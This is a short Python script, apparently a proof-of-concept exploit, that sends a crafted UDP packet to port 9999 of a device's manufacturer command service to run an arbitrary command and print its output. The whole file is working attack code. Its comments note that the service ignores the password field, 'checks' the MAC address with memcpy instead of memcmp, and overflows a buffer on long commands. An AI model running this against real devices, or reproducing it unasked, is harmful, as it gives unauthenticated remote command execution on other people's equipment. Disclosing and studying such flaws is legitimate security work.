#!/usr/bin/env python3
 
import sys, os, socket, struct
 
 
PORT = 9999
 
if len(sys.argv) < 3:
    print('Usage: ' + sys.argv[0] + ' <ip> <command>', file=sys.stderr)
    sys.exit(1)
 
 
ip = sys.argv[1]
cmd = sys.argv[2]
 
enccmd = cmd.encode()
 
if len(enccmd) > 237:
    # Strings longer than 237 bytes cause the buffer to overflow and 
possibly crash the server.
    print('Values over 237 will give rise to undefined behaviour.', 
file=sys.stderr)
    sys.exit(1)
 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', PORT))
sock.settimeout(2)
 
# Request consists of following things
# ServiceID     [byte]      ; NET_SERVICE_ID_IBOX_INFO
# PacketType    [byte]      ; NET_PACKET_TYPE_CMD
# OpCode        [word]      ; NET_CMD_ID_MANU_CMD
# Info          [dword]     ; Comment: "Or Transaction ID"
# MacAddress    [byte[6]]   ; Double-wrongly "checked" with memcpy 
instead of memcmp
# Password      [byte[32]]  ; Not checked at all
# Length        [word]
# Command       [byte[420]] ; 420 bytes in struct, 256 - 19 unusable in 
code = 237 usable
 
packet = (b'\x0C\x15\x33\x00' + os.urandom(4) + (b'\x00' * 38) + 
struct.pack('<H', len(enccmd)) + enccmd).ljust(512, b'\x00')
 
sock.sendto(packet, (ip, PORT))
 
 
# Response consists of following things
# ServiceID     [byte]      ; NET_SERVICE_ID_IBOX_INFO
# PacketType    [byte]      ; NET_PACKET_TYPE_RES
# OpCode        [word]      ; NET_CMD_ID_MANU_CMD
# Info          [dword]     ; Equal to Info of request
# MacAddress    [byte[6]]   ; Filled in for us
# Length        [word]
# Result        [byte[420]] ; Actually returns that amount
 
while True:
    data, addr = sock.recvfrom(512)
 
    if len(data) == 512 and data[1] == 22:
        break
 
length = struct.unpack('<H', data[14:16])[0]
s = slice(16, 16+length)
sys.stdout.buffer.write(data[s])
 
sock.close()

